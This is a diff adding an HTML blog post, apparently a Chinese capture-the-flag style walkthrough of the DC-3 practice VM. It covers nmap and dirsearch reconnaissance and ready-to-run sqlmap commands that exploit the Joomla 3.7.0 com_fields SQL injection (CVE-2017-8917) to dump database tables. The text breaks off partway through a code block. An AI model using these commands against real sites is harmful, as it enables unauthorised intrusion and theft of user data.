@@ -1,0 +1,730 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-3 靶机信息收集12345678910┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.125Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-10 10:26 EDTNmap scan report for 192.168.56.125Host is up (0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-3 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/d3fd0d829200.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="DC-3 靶机信息收集12345678910┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.125Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-10 10:26 EDTNmap scan report for 192.168.56.125Host is up (0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9e341effab3058db896fd9ea4bbf42b9_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7bcf2562d3dc9c92980cf07ea78dbdc7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e219b70abb4bdc9984453c4a5b08d04d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/fea345c955a85e5d477b1e5bbe477504_MD5.png">
+<meta property="article:published_time" content="2023-07-11T02:38:31.000Z">
+<meta property="article:modified_time" content="2023-07-11T12:35:00.098Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/9e341effab3058db896fd9ea4bbf42b9_MD5.png">
+  
+  
+  
+  <title>DC-3 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-3 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-11 10:38" pubdate>
+          2023年7月11日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          30k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          247 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC-3 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-3-靶机"><a href="#DC-3-靶机" class="headerlink" title="DC-3 靶机"></a>DC-3 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.125<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00074s latency).                                                                                      <br>Not shown: 65534 closed tcp ports (reset)                                                                           <br>PORT   STATE SERVICE                                                                                                <br>80/tcp open  http                                                                                                   <br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.30 seconds<br></code></pre></td></tr></table></figure>
+
+<p>TCP 只有一个 80 端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00057s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.27 seconds<br></code></pre></td></tr></table></figure>
+
+<p>使用的是 Joomla, Ubuntu 操作系统。印象中 Joomla 应该有很多漏洞，再看一眼 UDP 扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3/rsa/2048]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 22:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00061s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.92 seconds<br></code></pre></td></tr></table></figure>
+
+<p>的确只有这个端口开放着，nmap 漏洞脚本扫描一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80 192.168.56.125     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 10:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.125<br>Host is up (0.00069s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>| http-internal-ip-disclosure: <br>|_  Internal IP Leaked: 127.0.1.1<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-vuln-cve2017-8917: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Joomla! 3.7.0 &#x27;</span>com_fields<span class="hljs-string">&#x27; SQL Injection Vulnerability</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2017-8917</span><br><span class="hljs-string">|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</span><br><span class="hljs-string">|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers</span><br><span class="hljs-string">|       to execute aribitrary SQL commands via unspecified vectors.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2017-05-17</span><br><span class="hljs-string">|     Extra information:</span><br><span class="hljs-string">|       User: root@localhost</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917</span><br><span class="hljs-string">|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.125<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.125:80/<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=reset&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: user-registration<br>|     Form action: /index.php/component/users/?task=reset.request&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=reset&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php/component/users/?Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/2-uncategorised/1-welcome<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=remind&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: user-registration<br>|     Form action: /index.php/component/users/?task=remind.remind&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/?view=remind&amp;amp;Itemid=101<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|     Form action: /index.php/component/users/?Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/<br>|     Form <span class="hljs-built_in">id</span>: username-lbl<br>|     Form action: /index.php/component/users/?task=user.login&amp;Itemid=101<br>|     <br>|     Path: http://192.168.56.125:80/index.php/component/users/<br>|     Form <span class="hljs-built_in">id</span>: login-form<br>|_    Form action: /index.php/component/users/?Itemid=101<br>| http-enum: <br>|   /administrator/: Possible admin folder<br>|   /administrator/index.php: Possible admin folder<br>|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0<br>|   /language/en-GB/en-GB.xml: Joomla version 3.7.0<br>|   /htaccess.txt: Joomla!<br>|   /README.txt: Interesting, a readme.<br>|   /bin/: Potentially interesting folder<br>|   /cache/: Potentially interesting folder<br>|   /images/: Potentially interesting folder<br>|   /includes/: Potentially interesting folder<br>|   /libraries/: Potentially interesting folder<br>|   /modules/: Potentially interesting folder<br>|   /templates/: Potentially interesting folder<br>|_  /tmp/: Potentially interesting folder<br>MAC Address: 08:00:27:CC:D5:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 327.57 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>提到了 cve2017-8917 漏洞，还给出了许多目录和文件，顺便目录爆破一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.125  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.125/_23-07-10_10-50-31.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-10_10-50-31.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.125/<br><br>[10:50:31] Starting: <br>[10:50:32] 403 -  300B  - /.ht_wsr.txt                                     <br>[10:50:32] 403 -  303B  - /.htaccess.bak1<br>[10:50:32] 403 -  305B  - /.htaccess.sample<br>[10:50:32] 403 -  303B  - /.htaccess.orig<br>[10:50:32] 403 -  301B  - /.htaccess_sc<br>[10:50:32] 403 -  303B  - /.htaccess.save<br>[10:50:32] 403 -  301B  - /.htaccessBAK<br>[10:50:32] 403 -  303B  - /.htaccess_orig<br>[10:50:32] 403 -  304B  - /.htaccess_extra<br>[10:50:32] 403 -  302B  - /.htaccessOLD2<br>[10:50:32] 403 -  301B  - /.htaccessOLD                                    <br>[10:50:32] 403 -  293B  - /.htm<br>[10:50:32] 403 -  294B  - /.html<br>[10:50:32] 403 -  300B  - /.httr-oauth<br>[10:50:32] 403 -  299B  - /.htpasswds<br>[10:50:32] 403 -  303B  - /.htpasswd_test                                  <br>[10:50:33] 403 -  293B  - /.php                                            <br>[10:50:33] 403 -  294B  - /.php3                                           <br>[10:50:36] 200 -   18KB - /LICENSE.txt<br>[10:50:36] 200 -    4KB - /README.txt<br>[10:50:42] 301 -  324B  - /administrator  -&gt;  http://192.168.56.125/administrator/<br>[10:50:42] 403 -  312B  - /administrator/.htaccess<br>[10:50:42] 200 -    5KB - /administrator/<br>[10:50:42] 200 -   31B  - /administrator/cache/<br>[10:50:42] 200 -    2KB - /administrator/includes/<br>[10:50:42] 200 -    5KB - /administrator/index.php<br>[10:50:42] 200 -   31B  - /administrator/logs/<br>[10:50:42] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.56.125/administrator/logs/<br>[10:50:45] 301 -  314B  - /bin  -&gt;  http://192.168.56.125/bin/<br>[10:50:45] 200 -   31B  - /bin/<br>[10:50:45] 301 -  316B  - /cache  -&gt;  http://192.168.56.125/cache/<br>[10:50:45] 200 -   31B  - /cache/<br>[10:50:46] 200 -   31B  - /cli/<br>[10:50:46] 301 -  321B  - /components  -&gt;  http://192.168.56.125/components/<br>[10:50:46] 200 -   31B  - /components/<br>[10:50:47] 200 -    0B  - /configuration.php<br>[10:50:52] 200 -    3KB - /htaccess.txt<br>[10:50:52] 301 -  317B  - /images  -&gt;  http://192.168.56.125/images/<br>[10:50:52] 200 -   31B  - /images/<br>[10:50:52] 301 -  319B  - /includes  -&gt;  http://192.168.56.125/includes/<br>[10:50:52] 200 -   31B  - /includes/<br>[10:50:53] 200 -    7KB - /index.php<br>[10:50:54] 301 -  319B  - /language  -&gt;  http://192.168.56.125/language/<br>[10:50:54] 200 -   31B  - /layouts/<br>[10:50:54] 301 -  320B  - /libraries  -&gt;  http://192.168.56.125/libraries/<br>[10:50:54] 200 -   31B  - /libraries/<br>[10:50:55] 301 -  316B  - /media  -&gt;  http://192.168.56.125/media/<br>[10:50:56] 200 -   31B  - /media/<br>[10:50:56] 301 -  318B  - /modules  -&gt;  http://192.168.56.125/modules/<br>[10:50:56] 200 -   31B  - /modules/<br>[10:51:00] 301 -  318B  - /plugins  -&gt;  http://192.168.56.125/plugins/<br>[10:51:00] 200 -   31B  - /plugins/<br>[10:51:02] 200 -  836B  - /robots.txt.dist<br>[10:51:02] 403 -  303B  - /server-status/<br>[10:51:02] 403 -  302B  - /server-status<br>[10:51:05] 200 -   31B  - /templates/<br>[10:51:05] 200 -    0B  - /templates/protostar/<br>[10:51:05] 200 -    0B  - /templates/beez3/<br>[10:51:05] 200 -   31B  - /templates/index.html<br>[10:51:05] 301 -  320B  - /templates  -&gt;  http://192.168.56.125/templates/<br>[10:51:05] 200 -    0B  - /templates/system/<br>[10:51:06] 301 -  314B  - /tmp  -&gt;  http://192.168.56.125/tmp/<br>[10:51:06] 200 -   31B  - /tmp/<br>[10:51:08] 200 -    2KB - /web.config.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="Joomla-Sql-Injection"><a href="#Joomla-Sql-Injection" class="headerlink" title="Joomla Sql Injection"></a>Joomla Sql Injection</h2><p>在 db-exploit 中搜到了响应的漏洞利用脚本，其中给出了如何使用 SQLMap 进行注入</p>
+<p><img src="/pic/9e341effab3058db896fd9ea4bbf42b9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试按照上面的命令来操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] --tables<br><br>┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] -T <span class="hljs-string">&#x27;#__users&#x27;</span> --columns<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 